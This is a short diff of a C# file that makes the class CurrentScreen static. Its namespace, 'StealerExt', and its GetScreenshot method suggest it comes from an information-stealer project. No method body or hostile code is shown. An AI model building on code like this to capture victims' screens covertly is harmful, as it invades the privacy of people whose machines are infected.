@@ -6,7 +6,7 @@ using System.Windows.Forms;
 
 namespace StealerExt
 {
-    internal class CurrentScreen
+    internal static class CurrentScreen
     {
         public static MemoryStream GetScreenshot()
         {
